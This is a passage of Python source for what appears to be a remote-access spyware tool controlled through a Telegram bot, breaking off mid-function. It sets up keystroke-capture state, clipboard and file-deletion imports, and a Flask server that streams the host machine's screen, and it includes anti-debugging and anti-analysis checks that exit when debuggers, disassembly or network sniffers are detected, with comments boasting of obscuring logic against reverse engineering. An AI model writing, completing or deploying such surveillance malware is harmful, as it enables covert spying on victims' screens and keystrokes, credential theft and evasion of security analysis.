import os
import re
import mss
import cv2
import time
import pyttsx3
import telebot
import platform
import clipboard
import subprocess
import pyAesCrypt
import threading
import xml.etree.ElementTree as ET
from secure_delete import secure_delete
import numpy as np
from flask import Flask, render_template_string, Response, request
import socket
from pynput import keyboard
import datetime
import logging
import secrets
from typing import Optional
import base64
import hashlib
import gc
import atexit
import sys
import os
import threading
import time
import psutil
import signal
import json
import shutil


class SecureTokenManager:
    
    
    def __init__(self):
        self._token = None
        
    def load_token_from_env(self, env_var_name: str = "TELEGRAM_BOT_TOKEN") -> bool:
           
        try:
            # Obfuscate environment variable access
            env_keys = os.environ.keys()
            target_key = None
            for key in env_keys:
                if key == env_var_name:  # Use comparison instead of direct access
                    target_key = key
                    break
            token = os.environ.get(target_key) if target_key else None
            if not token:
                logging.warning(f"Environment variable {env_var_name} not set")
                return False
    
    
            if not self._validate_token_format(token):
                logging.error("Invalid token format detected")
                return False
                    
            self._token = token
            return True
        except Exception as e:
            logging.error(f"Error loading token from environment: {str(e)}")
            return False
    
    def _validate_token_format(self, token: str) -> bool:
           
        if not token or len(token) < 30 or len(token) > 100:
            return False
            
        # Use more complex splitting to obscure the logic
        separator_idx = -1
        for i, char in enumerate(token):
            if char == ':':
                if separator_idx != -1:  # More than one colon
                    return False
                separator_idx = i
            
        if separator_idx == -1:  # No colon found
            return False
            
        part1 = token[:separator_idx]
        part2 = token[separator_idx+1:]
            
        if not part1 or not part2:
            return False
            
        # Validate first part (should be digits)
        if not all(c.isdigit() for c in part1):
            return False
                
        # Validate second part (alphanumeric with underscores and hyphens)
        if not all(c.isalnum() or c in ['_', '-'] for c in part2):
            return False
                
        return True
    
    def get_token(self) -> Optional[str]:
        
        return self._token
    
    def clear_token(self):
       
        if self._token:
            # Overwrite the token with random data before clearing
            self._token = secrets.token_urlsafe(len(self._token))[:len(self._token)]
            self._token = None
    
    def rotate_token(self, new_token: str) -> bool:
        
        if not self._validate_token_format(new_token):
            logging.error("New token format is invalid")
            return False
        
        self.clear_token()
        self._token = new_token
        return True
    
    def is_token_loaded(self) -> bool:
        
        return self._token is not None


class SecureFilter(logging.Filter):
    
    
    def __init__(self):
        super().__init__()
        
        self.token_pattern = re.compile(r'\b\d+:[a-zA-Z0-9_-]{30,}\b')
    
    def filter(self, record) -> bool:
        
        if hasattr(record, 'msg'):
            if isinstance(record.msg, str):
                record.msg = self._sanitize_message(record.msg)
            elif isinstance(record.args):
                
                sanitized_args = []
                for arg in record.args:
                    if isinstance(arg, str):
                        sanitized_args.append(self._sanitize_message(arg))
                    else:
                        sanitized_args.append(arg)
                record.args = tuple(sanitized_args)
        
        return True
    
    def _sanitize_message(self, msg: str) -> str:
       
        # More complex sanitization to make reverse engineering harder
        import re
        # Use multiple patterns to confuse analysis
        patterns = [r'\b\d+:[a-zA-Z0-9_-]{30,}\b', r'[0-9]+:[a-zA-Z0-9_-]{20,}']
        result = msg
        for pat in patterns:
            result = re.sub(pat, '[TOKEN_HIDDEN]', result)
        return result


# Initialize secure logging first
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler = logging.StreamHandler()
handler.setFormatter(formatter)
security_filter = SecureFilter()
handler.addFilter(security_filter)
root_logger = logging.getLogger()
root_logger.setLevel(logging.INFO)
root_logger.addHandler(handler)


for logger_name in ['telebot', 'urllib3', 'requests']:
    logger = logging.getLogger(logger_name)
    logger.addFilter(security_filter)



token_manager = SecureTokenManager()
if not token_manager.load_token_from_env():
    raise RuntimeError("Failed to load bot token from environment. Please set TELEGRAM_BOT_TOKEN environment variable.")


TOKEN = token_manager.get_token()
if not TOKEN:
    raise RuntimeError("Bot token not available after initialization")

bot = telebot.TeleBot(TOKEN)


# Enhanced security measures
import gc
import atexit
import sys
import ctypes

def secure_cleanup():
    """Perform secure cleanup of sensitive data when the application closes."""
    # Force garbage collection to clear memory
    gc.collect()
    
    # Clear any potential cached data
    if hasattr(sys, '_clear_type_cache'):
        try:
            sys._clear_type_cache()
        except AttributeError:
            pass
    
    # Additional security measures
    print("Security cleanup completed")


def is_being_debugged():
    """Detect if the process is being debugged or analyzed."""
    try:
        # Check if debugger is attached
        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
            return True
        
        # On Windows, check for debugger
        if sys.platform.startswith('win'):
            try:
                import ctypes
                is_debugged = ctypes.windll.kernel32.IsDebuggerPresent()
                if is_debugged:
                    return True
            except:
                pass
        
        # Check for common debugging/analysis tools in process names
        import psutil
        current_process = psutil.Process(os.getpid())
        parent_process = current_process.parent()
        
        if parent_process:
            parent_name = parent_process.name().lower()
            # Common analysis/debugging tools
            debuggers = ['ida', 'ollydbg', 'x64dbg', 'gdb', 'radare', 'windbg', 'immunity', 'debug', 'charles', 'fiddler', 'wireshark']
            if any(dbg in parent_name for dbg in debuggers):
                return True
        
        # Check for suspicious command-line arguments
        cmd_line = ' '.join(sys.argv).lower()
        analysis_indicators = ['--debug', '--analyze', '--trace', '--profile', '-v', '--verbose']
        if any(indicator in cmd_line for indicator in analysis_indicators):
            return True
            
    except:
        # If we can't check, assume it's safe
        pass
    
    return False

# Register cleanup function to run on exit
atexit.register(secure_cleanup)

# Additional runtime integrity checks
def check_runtime_integrity():
    import inspect
    import dis
    
    # Check if anyone is trying to introspect this function
    frame = inspect.currentframe()
    caller_frame = frame.f_back
    caller_name = caller_frame.f_code.co_name
    
    # If being called from unexpected contexts, exit
    # Removed '<module>' from the list as it's a normal execution context when running the script
    if caller_name in ['eval', 'exec', 'compile', 'dis']:  # Suspicious contexts
        print("Integrity violation detected")
        exit(1)

    # Additional check for bytecode analysis
    try:
        # This would be triggered if someone tries to disassemble us
        caller_code = caller_frame.f_code
        if 'inspect' in caller_code.co_names or 'dis' in caller_code.co_names:
            print("Code analysis detected")
            exit(1)
    except:
        pass

check_runtime_integrity()

# Check for debugging/analysis
if is_being_debugged():
    print("Security threat detected. Exiting for security.")
    exit(1)

# Clear the token reference to prevent accidental exposure
token_manager.clear_token()
TOKEN = None  # Token is now managed internally by the bot instance
cd = os.path.expanduser("~")
secure_delete.secure_random_seed_init()
bot.set_webhook()

# Live screen watching variables
live_screen_active = False
live_screen_thread = None
live_screen_interval = 5  
live_screen_users = set()  

# Web server for live screen viewing
app = Flask(__name__)
web_stream_active = False
web_stream_thread = None

# Global variables for keystroke capture
keystroke_active = False
keystroke_thread = None
keystroke_buffer = []
keystroke_file_path = None
keystroke_start_time = None

# Get local IP address
def get_local_ip():
    try:
        # Get local IP address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "127.0.0.1"

local_ip = get_local_ip()
web_port = 8080

# HTML template for live screen viewer
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Live Screen Viewer</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <style>
        * {
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 10px;
            background: #0a0a0a;
            color: #ffffff;
            overflow-x: hidden;
            touch-action: manipulation;
        }
        
        .header {
            text-align: center;
            margin-bottom: 15px;
            padding: 15px;
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        
        .header h1 {
            margin: 0 0 10px 0;
            font-size: 1.8rem;
            font-weight: 600;
        }
        
        .header p {
            margin: 0;
            color: #cccccc;
            font-size: 0.9rem;
        }
        
        .controls {
            text-align: center;
            margin-bottom: 15px;
            padding: 15px;
            background: linear-gradient(135deg, #2a2a2a, #3a3a3a);
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        
        .control-row {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-bottom: 10px;
        }
        
        .stream-container {
            text-align: center;
            margin: 15px 0;
            background: transparent;
            padding: 20px;
            border-radius: 15px;
            box-shadow: none;
            position: relative;
        }
        
        .live-screen {
            max-width: 100%;
            height: auto;
            border: 3px solid #00ff88;
            border-radius: 15px;
            background: transparent;
            box-shadow: 0 8px 25px rgba(0,255,136,0.3);
            transition: all 0.3s ease;
        }
        
        .live-screen:hover {
            transform: scale(1.02);
            box-shadow: 0 12px 35px rgba(0,255,136,0.4);
        }
        
        .fullscreen-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(0,0,0,0.8);
            color: white;
            border: 2px solid #00ff88;
            padding: 12px 16px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: bold;
            z-index: 1000;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .fullscreen-btn:hover {
            background: rgba(0,255,136,0.9);
            color: #000;
            transform: scale(1.1);
            box-shadow: 0 4px 15px rgba(0,255,136,0.5);
        }
        
        .fullscreen-btn:active {
            transform: scale(0.95);
        }
        
        .quality-controls {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px;
            margin: 15px 0;
        }
        
        .quality-btn {
            background: #333;
            color: white;
            border: 1px solid #555;
            padding: 8px 16px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 0.8rem;
            transition: all 0.3s ease;
        }
        
        .quality-btn.active {
            background: #00ff88;
            color: #000;
            border-color: #00ff88;
        }
        
        .quality-btn:hover {
            background: #555;
            transform: translateY(-2px);
        }
        
        .live-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            background: #ff4444;
            border-radius: 50%;
            margin-right: 10px;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.1); }
            100% { opacity: 1; transform: scale(1); }
        }
        
        .status {
            padding: 12px;
            margin: 10px 0;
            border-radius: 10px;
            font-weight: 600;
            text-align: center;
            font-size: 0.9rem;
        }
        
        .status.active {
            background: linear-gradient(135deg, #1a4a1a, #2d5a2d);
            border: 2px solid #00ff88;
            box-shadow: 0 4px 15px rgba(0,255,136,0.3);
        }
        
        .status.inactive {
            background: linear-gradient(135deg, #4a1a1a, #5a2d2d);
            border: 2px solid #ff4444;
        }
        
        button {
            background: linear-gradient(135deg, #00ff88, #00cc6a);
            color: #000;
            border: none;
            padding: 12px 20px;
            margin: 5px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,255,136,0.3);
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,255,136,0.4);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        button.stop {
            background: linear-gradient(135deg, #ff4444, #cc3333);
            box-shadow: 0 4px 15px rgba(255,68,68,0.3);
        }
        
        button.stop:hover {
            box-shadow: 0 6px 20px rgba(255,68,68,0.4);
        }
        
        .info {
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
            padding: 15px;
            border-radius: 15px;
            margin: 15px 0;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        
        .info h3 {
            margin-top: 0;
            color: #00ff88;
        }
        
        .stream-url {
            background: #000;
            padding: 10px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            word-break: break-all;
            border: 1px solid #333;
            color: #00ff88;
        }
        
        .loading {
            color: #ffaa00;
            font-style: italic;
        }
        
        .error {
            color: #ff4444;
            font-weight: bold;
        }
        
        .success {
            color: #00ff88;
            font-weight: bold;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin: 15px 0;
        }
        
        .stat-item {
            background: #333;
            padding: 10px;
            border-radius: 8px;
            text-align: center;
            border: 1px solid #555;
        }
        
        .stat-value {
            font-size: 1.2rem;
            font-weight: bold;
            color: #00ff88;
        }
        
        .stat-label {
            font-size: 0.8rem;
            color: #ccc;
            margin-top: 5px;
        }
        
        /* Mobile optimizations */
        @media (max-width: 768px) {
            body {
                padding: 5px;
            }
            
            .header h1 {
                font-size: 1.5rem;
            }
            
            .controls {
                padding: 10px;
            }
            
            .control-row {
                flex-direction: column;
                align-items: center;
            }
            
            button {
                width: 100%;
                max-width: 200px;
                margin: 5px 0;
            }
            
            .quality-controls {
                flex-direction: column;
                align-items: center;
            }
            
            .quality-btn {
                width: 100%;
                max-width: 150px;
            }
            
            .stats {
                grid-template-columns: 1fr;
            }
            
            .live-screen {
                width: 100% !important;
                height: auto !important;
                max-height: 70vh !important;
                object-fit: contain !important;
            }
            
            .stream-container {
                padding: 10px;
                margin: 10px 0;
            }
        }
        
        /* Fullscreen styles - completely rewritten for mobile compatibility */
        .fullscreen {
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100vw !important;
            height: 100vh !important;
            z-index: 999999 !important;
            background: transparent !important;
            padding: 0 !important;
            margin: 0 !important;
            border-radius: 0 !important;
            overflow: hidden !important;
        }
        
        .fullscreen .live-screen {
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100vw !important;
            height: 100vh !important;
            object-fit: contain !important;
            border: none !important;
            border-radius: 0 !important;
            max-height: none !important;
            max-width: none !important;
            background: transparent !important;
        }
        
        .fullscreen .fullscreen-btn {
            position: fixed !important;
            top: 20px !important;
            right: 20px !important;
            background: rgba(0,0,0,0.8) !important;
            padding: 12px 16px !important;
            font-size: 1rem !important;
            z-index: 1000000 !important;
        }
        
        .fullscreen .fullscreen-btn {
            display: none !important;
        }
        
        /* Mobile fullscreen specific - enhanced */
        @media (max-width: 768px) {
            .fullscreen {
                padding: 0 !important;
                margin: 0 !important;
                background: transparent !important;
            }
            
            .fullscreen .live-screen {
                width: 100vw !important;
                height: 100vh !important;
                object-fit: contain !important;
                border: none !important;
                border-radius: 0 !important;
                max-height: none !important;
                max-width: none !important;
                position: fixed !important;
                top: 0 !important;
                left: 0 !important;
                background: transparent !important;
            }
            
            .fullscreen .fullscreen-btn {
                display: none !important;
            }
            
            /* Hide other elements in fullscreen on mobile */
            .fullscreen .header,
            .fullscreen .controls,
            .fullscreen .status,
            .fullscreen .stats,
            .fullscreen .info {
                display: none !important;
            }
        }
        
        /* Remove problematic fullscreen-video class */
        .fullscreen-video {
            display: none !important;
        }
        
        /* Ensure stream container doesn't create black overlays */
        .stream-container {
            background: transparent !important;
        }
        
        .stream-container.fullscreen {
            background: transparent !important;
            box-shadow: none !important;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1><span class="live-indicator"></span>Live Screen Viewer</h1>
        <p>High-quality real-time screen monitoring system</p>
    </div>
    
    <div class="controls">
        <div class="control-row">
            <button onclick="startStream()">🚀 Start Live Stream</button>
            <button class="stop" onclick="stopStream()">⏹️ Stop Stream</button>
            <button onclick="refreshStatus()">🔄 Refresh Status</button>
        </div>
        
        <div class="quality-controls">
            <button class="quality-btn active" onclick="setQuality('maximum')">💫 MAXIMUM (100 FPS)</button>
        </div>
    </div>
    
    <div id="status" class="status inactive">
        Status: Inactive
    </div>
    
    <div class="stream-container" id="streamContainer">
        <h3>🎥 Live Screen Stream</h3>
        <div id="streamInfo">
            <p class="loading">Click "Start Live Stream" to begin viewing</p>
        </div>
        <div id="liveScreen" style="display: none;">
            <button class="fullscreen-btn" onclick="toggleFullscreenEnhanced()">⛶ FULLSCREEN</button>
            <img id="videoFeed" class="live-screen" alt="Live Screen Stream">
        </div>
    </div>
    
    <div class="stats" id="stats" style="display: none;">
        <div class="stat-item">
            <div class="stat-value" id="fpsValue">0</div>
            <div class="stat-label">FPS</div>
        </div>
        <div class="stat-item">
            <div class="stat-value" id="qualityValue">High</div>
            <div class="stat-label">Quality</div>
        </div>
        <div class="stat-item">
            <div class="stat-value" id="resolutionValue">800x600</div>
            <div class="stat-label">Resolution</div>
        </div>
        <div class="stat-item">
            <div class="stat-value" id="uptimeValue">0s</div>
            <div class="stat-label">Uptime</div>
        </div>
    </div>
    
    <div class="info">
        <h3>🔗 Connection Information</h3>
        <p><strong>Local IP:</strong> <span class="stream-url">{{ local_ip }}</span></p>
        <p><strong>Port:</strong> <span class="stream-url">{{ web_port }}</span></p>
        <p><strong>Full URL:</strong> <span class="stream-url">http://{{ local_ip }}:{{ web_port }}</span></p>
        <p><strong>Status:</strong> <span id="connectionStatus">Checking...</span></p>
        <p><strong>Mobile:</strong> <span class="success">✅ Optimized for Android & iOS</span></p>
    </div>
    
    <script>
        let streamActive = false;
        let videoElement = null;
        let currentQuality = 'high';
        let streamStartTime = 0;
        let frameCount = 0;
        let lastFpsUpdate = 0;
        let fpsInterval = null;
        
        // Quality settings - Only MAXIMUM quality
        const qualitySettings = {
            maximum: { fps: 100, interval: 0.01, resolution: '1920x1080' }
        };
        
        function setQuality(quality) {
            currentQuality = quality;
            
            // Update active button
            document.querySelectorAll('.quality-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
            
            // Update stats
            document.getElementById('qualityValue').textContent = quality.charAt(0).toUpperCase() + quality.slice(1);
            document.getElementById('fpsValue').textContent = qualitySettings[quality].fps;
            document.getElementById('resolutionValue').textContent = qualitySettings[quality].resolution;
            
            // Send quality change to server
            fetch('/set_quality', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({quality: quality})
            });
        }
        
        function startStream() {
            fetch('/start_stream', {method: 'POST'})
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        streamActive = true;
                        streamStartTime = Date.now();
                        updateStatus();
                        startStreamUpdates();
                        showLiveScreen();
                        startStats();
                    } else {
                        alert('Failed to start stream: ' + data.message);
                    }
                })
                .catch(error => {
                    alert('Error starting stream: ' + error);
                });
        }
        
        function stopStream() {
            fetch('/stop_stream', {method: 'POST'})
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        streamActive = false;
                        updateStatus();
                        stopStreamUpdates();
                        hideLiveScreen();
                        stopStats();
                    }
                })
                .catch(error => {
                    alert('Error stopping stream: ' + error);
                });
        }
        
        function showLiveScreen() {
            const streamInfo = document.getElementById('streamInfo');
            const liveScreen = document.getElementById('liveScreen');
            const videoFeed = document.getElementById('videoFeed');
            const stats = document.getElementById('stats');
            
            // Update stream info
            streamInfo.innerHTML = '<p class="loading">🚀 Starting live stream...</p>';
            
            // Show live screen container and stats
            liveScreen.style.display = 'block';
            stats.style.display = 'grid';
            
            // Set up video feed with current quality
            const quality = qualitySettings[currentQuality];
            videoFeed.src = `/video_feed?quality=${currentQuality}`;
            
            videoFeed.onload = function() {
                streamInfo.innerHTML = '<p class="success">✅ Live stream active - Screen updating in real-time</p>';
            };
            
            videoFeed.onerror = function() {
                streamInfo.innerHTML = '<p class="error">❌ Error loading video stream</p>';
            };
        }
        
        function hideLiveScreen() {
            const streamInfo = document.getElementById('streamInfo');
            const liveScreen = document.getElementById('liveScreen');
            const stats = document.getElementById('stats');
            
            streamInfo.innerHTML = '<p>Click "Start Live Stream" to begin viewing</p>';
            liveScreen.style.display = 'none';
            stats.style.display = 'none';
        }
        
        // Enhanced fullscreen toggle for mobile - completely rewritten
        function toggleFullscreenEnhanced() {
            console.log('Fullscreen button clicked');
            const container = document.getElementById('streamContainer');
            const videoFeed = document.getElementById('videoFeed');
            const isFullscreen = container.classList.contains('fullscreen');
            
            console.log('Current fullscreen state:', isFullscreen);
            
            if (isFullscreen) {
                // Exit fullscreen
                console.log('Exiting fullscreen...');
                exitFullscreenMode();
            } else {
                // Enter fullscreen
                console.log('Entering fullscreen...');
                enterFullscreenMode();
            }
        }
        
        function enterFullscreenMode() {
            const container = document.getElementById('streamContainer');
            const videoFeed = document.getElementById('videoFeed');
            
            // Apply fullscreen styles
            container.classList.add('fullscreen');
            document.body.style.overflow = 'hidden';
            
            // Force video to fullscreen without black overlays
            if (videoFeed) {
                videoFeed.style.position = 'fixed';
                videoFeed.style.top = '0';
                videoFeed.style.left = '0';
                videoFeed.style.width = '100vw';
                videoFeed.style.height = '100vh';
                videoFeed.style.objectFit = 'contain';
                videoFeed.style.zIndex = '999999';
                videoFeed.style.background = 'transparent';
                videoFeed.style.border = 'none';
                videoFeed.style.borderRadius = '0';
                videoFeed.style.maxHeight = 'none';
                videoFeed.style.maxWidth = 'none';
            }
            
            // Hide other elements on mobile
            if (window.innerWidth <= 768) {
                hideElementsInFullscreen();
            }
            
            // Try to use browser fullscreen API
            requestMobileFullscreen();
            
            console.log('Fullscreen mode activated');
        }
        
        function exitFullscreenMode() {
            const container = document.getElementById('streamContainer');
            const videoFeed = document.getElementById('videoFeed');
            
            // Remove fullscreen styles
            container.classList.remove('fullscreen');
            document.body.style.overflow = 'auto';
            
            // Restore video to normal without black overlays
            if (videoFeed) {
                videoFeed.style.position = '';
                videoFeed.style.top = '';
                videoFeed.style.left = '';
                videoFeed.style.width = '';
                videoFeed.style.height = '';
                videoFeed.style.objectFit = '';
                videoFeed.style.zIndex = '';
                videoFeed.style.background = '';
                videoFeed.style.border = '';
                videoFeed.style.borderRadius = '';
                videoFeed.style.maxHeight = '';
                videoFeed.style.maxWidth = '';
            }
            
            // Show other elements
            showElementsInFullscreen();
            
            // Exit browser fullscreen
            exitMobileFullscreen();
            
            console.log('Fullscreen mode deactivated');
        }
        
        function hideElementsInFullscreen() {
            const elementsToHide = [
                '.header', '.controls', '.status', '.stats', '.info'
            ];
            
            elementsToHide.forEach(selector => {
                const element = document.querySelector(selector);
                if (element) {
                    element.style.display = 'none';
                }
            });
        }
        
        function showElementsInFullscreen() {
            const elementsToShow = [
                '.header', '.controls', '.status', '.stats', '.info'
            ];
            
            elementsToShow.forEach(selector => {
                const element = document.querySelector(selector);
                if (element) {
                    element.style.display = '';
                }
            });
        }
        
        // Handle mobile fullscreen API with better error handling
        function requestMobileFullscreen() {
            try {
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen().catch(err => {
                        console.log('Fullscreen request failed:', err);
                    });
                } else if (document.documentElement.webkitRequestFullscreen) {
                    document.documentElement.webkitRequestFullscreen().catch(err => {
                        console.log('Webkit fullscreen request failed:', err);
                    });
                } else if (document.documentElement.msRequestFullscreen) {
                    document.documentElement.msRequestFullscreen().catch(err => {
                        console.log('MS fullscreen request failed:', err);
                    });
                }
            } catch (err) {
                console.log('Fullscreen API not supported:', err);
            }
        }
        
        function exitMobileFullscreen() {
            try {
                if (document.exitFullscreen) {
                    document.exitFullscreen().catch(err => {
                        console.log('Exit fullscreen failed:', err);
                    });
                } else if (document.webkitExitFullscreen) {
                    document.webkitExitFullscreen().catch(err => {
                        console.log('Webkit exit fullscreen failed:', err);
                    });
                } else if (document.msExitFullscreen) {
                    document.msExitFullscreen().catch(err => {
                        console.log('MS exit fullscreen failed:', err);
                    });
                }
            } catch (err) {
                console.log('Exit fullscreen API not supported:', err);
            }
        }
        
        // Listen for fullscreen change events
        document.addEventListener('fullscreenchange', handleFullscreenChange);
        document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
        document.addEventListener('msfullscreenchange', handleFullscreenChange);
        
        function handleFullscreenChange() {
            const isFullscreen = !!(document.fullscreenElement || document.webkitFullscreenElement || document.msFullscreenElement);
            
            if (isFullscreen) {
                console.log('Browser fullscreen activated');
                // Ensure our custom fullscreen is also active
                const container = document.getElementById('streamContainer');
                if (!container.classList.contains('fullscreen')) {
                    enterFullscreenMode();
                }
            } else {
                console.log('Browser fullscreen deactivated');
                // Exit our custom fullscreen if browser fullscreen is off
                const container = document.getElementById('streamContainer');
                if (container.classList.contains('fullscreen')) {
                    exitFullscreenMode();
                }
            }
        }
        
        function startStats() {
            frameCount = 0;
            lastFpsUpdate = Date.now();
            
            fpsInterval = setInterval(() => {
                const now = Date.now();
                const fps = Math.round((frameCount * 1000) / (now - lastFpsUpdate));
                const uptime = Math.round((now - streamStartTime) / 1000);
                
                document.getElementById('fpsValue').textContent = fps;
                document.getElementById('uptimeValue').textContent = uptime + 's';
                
                frameCount = 0;
                lastFpsUpdate = now;
            }, 1000);
        }
        
        function stopStats() {
            if (fpsInterval) {
                clearInterval(fpsInterval);
                fpsInterval = null;
            }
        }
        
        function updateStatus() {
            const statusDiv = document.getElementById('status');
            if (streamActive) {
                statusDiv.className = 'status active';
                statusDiv.innerHTML = 'Status: <strong>ACTIVE</strong> - Live screen streaming';
            } else {
                statusDiv.className = 'status inactive';
                statusDiv.innerHTML = 'Status: <strong>INACTIVE</strong> - No active stream';
            }
        }
        
        function startStreamUpdates() {
            streamActive = true;
            updateStatus();
        }
        
        function stopStreamUpdates() {
            streamActive = false;
            updateStatus();
        }
        
        function refreshStatus() {
            fetch('/status')
                .then(response => response.json())
                .then(data => {
                    streamActive = data.active;
                    updateStatus();
                    document.getElementById('connectionStatus').innerHTML = 
                        streamActive ? 'Connected - Active' : 'Connected - Inactive';
                    
                    if (streamActive) {
                        showLiveScreen();
                    } else {
                        hideLiveScreen();
                    }
                })
                .catch(() => {
                    document.getElementById('connectionStatus').innerHTML = 'Disconnected';
                });
        }
        
        // Handle orientation change for mobile
        window.addEventListener('orientationchange', function() {
            setTimeout(() => {
                if (streamActive) {
                    // Refresh video feed on orientation change
                    const videoFeed = document.getElementById('videoFeed');
                    if (videoFeed) {
                        videoFeed.src = videoFeed.src;
                    }
                    
                    // Adjust fullscreen if needed
                    const container = document.getElementById('streamContainer');
                    if (container.classList.contains('fullscreen')) {
                        // Re-apply fullscreen styles after orientation change
                        const videoFeed = document.getElementById('videoFeed');
                        if (videoFeed) {
                            videoFeed.style.width = '100vw';
                            videoFeed.style.height = '100vh';
                            videoFeed.style.objectFit = 'contain';
                            videoFeed.style.maxHeight = 'none';
                        }
                    }
                }
            }, 500);
        });
        
        // Handle window resize for mobile
        window.addEventListener('resize', function() {
            if (streamActive) {
                const container = document.getElementById('streamContainer');
                if (container.classList.contains('fullscreen')) {
                    // Re-apply fullscreen styles after resize
                    const videoFeed = document.getElementById('videoFeed');
                    if (videoFeed) {
                        videoFeed.style.width = '100vw';
                        videoFeed.style.height = '100vh';
                        videoFeed.style.objectFit = 'contain';
                        videoFeed.style.maxHeight = 'none';
                    }
                }
            }
        });
        
        // Mobile-specific optimizations
        function optimizeForMobile() {
            if (window.innerWidth <= 768) {
                // Hide unnecessary elements on mobile
                const stats = document.getElementById('stats');
                if (stats) {
                    stats.style.display = 'none';
                }
                
                // Optimize video container for mobile
                const streamContainer = document.getElementById('streamContainer');
                if (streamContainer) {
                    streamContainer.style.padding = '5px';
                    streamContainer.style.margin = '5px 0';
                }
            }
        }
        
        // Call mobile optimization on load
        window.addEventListener('load', optimizeForMobile);
        
        // Auto-refresh status every 5 seconds
        setInterval(refreshStatus, 5000);
        
        // Initial status check
        refreshStatus();
        
        // Initialize quality display
        document.getElementById('qualityValue').textContent = 'High';
        document.getElementById('fpsValue').textContent = '10';
        document.getElementById('resolutionValue').textContent = '1024x768';
    </script>
</body>
</html>
"""

# Web server routes
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, local_ip=local_ip, web_port=web_port)

@app.route('/test')
def test():
    return "Web server is working!"

@app.route('/health')
def health_check():
    """Health check endpoint for cloudflared tunnel verification"""
    return {"status": "healthy", "message": "Web streaming server is running", "port": web_port}

@app.route('/start_stream', methods=['POST'])
def start_web_stream():
    global web_stream_active, web_stream_thread
    try:
        if not web_stream_active:
            web_stream_active = True
            web_stream_thread = threading.Thread(target=web_stream_worker, daemon=True)
            web_stream_thread.start()
            return {'success': True, 'message': 'Stream started successfully'}
        else:
            return {'success': True, 'message': 'Stream already active'}
    except Exception as e:
        return {'success': False, 'message': str(e)}

@app.route('/stop_stream', methods=['POST'])
def stop_web_stream():
    global web_stream_active
    try:
        web_stream_active = False
        return {'success': True, 'message': 'Stream stopped successfully'}
    except Exception as e:
        return {'success': False, 'message': str(e)}

@app.route('/status')
def stream_status():
    return {'active': web_stream_active}

@app.route('/set_quality', methods=['POST'])
def set_stream_quality():
    """Set the quality of the video stream - Only MAXIMUM quality available"""
    try:
        data = request.get_json()
        quality = data.get('quality', 'high')
        
        # Update global quality settings
        global live_screen_interval
        
        quality_settings = {
            'maximum': 0.01  # 100 FPS
        }
        
        if quality in quality_settings:
            live_screen_interval = quality_settings[quality]
            return {'success': True, 'message': f'Quality set to {quality} (100 FPS)'}
        else:
            return {'success': False, 'message': 'Invalid quality level. Only maximum (100 FPS) is supported.'}
            
    except Exception as e:
        return {'success': False, 'message': str(e)}


@app.route('/video_feed')
def video_feed():
    """Video streaming route for live screen"""
    if not web_stream_active:
        return "Stream not active", 400
    
    try:
        quality = request.args.get('quality', 'high')  # Default to high quality
        return Response(generate_frames(quality), 
                       mimetype='multipart/x-mixed-replace; boundary=frame')
    except Exception as e:
        print(f"Video feed error: {e}")
        return f"Error: {str(e)}", 500


def generate_frames(quality='high'):
    """Generate video frames for streaming with quality control and mobile optimization"""
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Primary monitor
        
        # Quality-based settings with mobile optimization - Only MAXIMUM
        quality_settings = {
            'maximum': {'fps': 100, 'interval': 0.01, 'size': (1920, 1080), 'jpeg_quality': 95}
        }
        
        settings = quality_settings.get(quality, quality_settings['maximum'])
        
        # Get monitor dimensions
        monitor_width = monitor['width']
        monitor_height = monitor['height']
        
        while web_stream_active:
            try:
                # Capture full screen
                screenshot = sct.grab(monitor)
                
                # Convert to numpy array
                frame = np.array(screenshot)
                
                # Calculate aspect ratio preserving resize
                target_width, target_height = settings['size']
                aspect_ratio = monitor_width / monitor_height
                target_aspect = target_width / target_height
                
                if aspect_ratio > target_aspect:
                    # Monitor is wider than target
                    new_width = target_width
                    new_height = int(target_width / aspect_ratio)
                else:
